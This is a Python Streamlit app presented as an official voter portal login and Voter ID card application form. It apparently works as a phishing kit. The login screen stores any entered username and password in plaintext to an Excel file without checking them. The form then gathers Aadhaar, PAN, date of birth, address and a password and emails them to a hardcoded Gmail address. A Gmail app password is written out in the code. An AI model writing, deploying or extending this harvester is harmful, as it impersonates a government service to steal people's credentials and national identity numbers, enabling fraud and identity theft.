import streamlit as st
import pandas as pd
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# --- Page Configuration ---
st.set_page_config(page_title="Voter Card Application", layout="centered")

# --- Function: Save login data to Excel ---
def save_to_excel(data, filename="data_excel.xlsx"):
    if os.path.exists(filename):
        df = pd.read_excel(filename)
        new_df = pd.concat([df, pd.DataFrame([data])], ignore_index=True)
    else:
        new_df = pd.DataFrame([data])
    new_df.to_excel(filename, index=False)

# --- Function: Send form data to Gmail ---
def send_email(form_data):
    # Important: Use Gmail App Password, not your regular password
    sender_email = "kiranhaldar234@gmail.com"  # # Enter your gmail address here
    receiver_email = "kiranhaldar234@gmail.com" # # Enter the receiver email address here
    password = "euyy kgbp acyr ebfs"        # # Enter your 16-digit App Password here

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "New Voter ID Application Received"

    # Formatting the email body
    body = "\n".join([f"{key}: {value}" for key, value in form_data.items()])
    msg.attach(MIMEText(body, 'plain'))

    try:
        # SMTP Server Setup
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, password)
        server.send_message(msg)
        server.quit()
        return True
    except Exception as e:
        print(f"Error: {e}")
        return False

# --- Session State: To track login status ---
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False

# --- SCREEN 1: Stylish Login Page ---
if not st.session_state.logged_in:
    st.markdown("<h2 style='text-align: center; color: #007bff;'>Voter Portal Login</h2>", unsafe_allow_html=True)
    
    with st.form("login_form"):
        username = st.text_input("Username / Email")
        password = st.text_input("Password", type="password")
        submit_login = st.form_submit_button("Login")

        if submit_login:
            # Check if input data is provided
            if username and password:
                login_info = {"Username": username, "Password": password}
                
                # Saving login data to Excel file
                save_to_excel(login_info) 
                
                # Switch to Screen 2
                st.session_state.logged_in = True
                st.rerun()
            else:
                st.error("Please enter correct login data to proceed")

# --- SCREEN 2: Voter ID Card Application Form ---
else:
    st.markdown("<h2 style='text-align: center;'>Voter ID Card Application Form</h2>", unsafe_allow_html=True)
    st.info("Fill up the form below carefully.")

    with st.form("voter_form"):
        col1, col2 = st.columns(2)
        
        with col1:
            full_name = st.text_input("Full Name")
            mobile = st.text_input("Mobile Number")
            aadhaar = st.text_input("Aadhaar Card Number")
            birth_cert = st.text_input("Birth Certificate Number")
        
        with col2:
            email_id = st.text_input("Email ID")
            pan_card = st.text_input("PAN Card Number")
            dob = st.date_input("Date of Birth")
            gender = st.selectbox("Gender", ["Male", "Female", "Other"])

        full_address = st.text_area("Address (Street, City, PIN Code)")
        create_password = st.text_input("Create Password", type="password")
        
        submit_application = st.form_submit_button("Submit Application")

        if submit_application:
            # Collecting all form data
            application_data = {
                "Name": full_name, 
                "Mobile": mobile, 
                "Email": email_id,
                "Aadhaar": aadhaar, 
                "PAN": pan_card, 
                "DOB": str(dob),
                "Address": full_address, 
                "Gender": gender,
                "Password": create_password
            }
            
            # Sending data to your Gmail
            if send_email(application_data):
                st.success("Form submitted! Data has been sent to your Gmail.")
            else:
                st.error("Failed to send email. Please check your App Password settings.")

    # Option to Logout
    if st.sidebar.button("Logout"):
        st.session_state.logged_in = False
        st.rerun()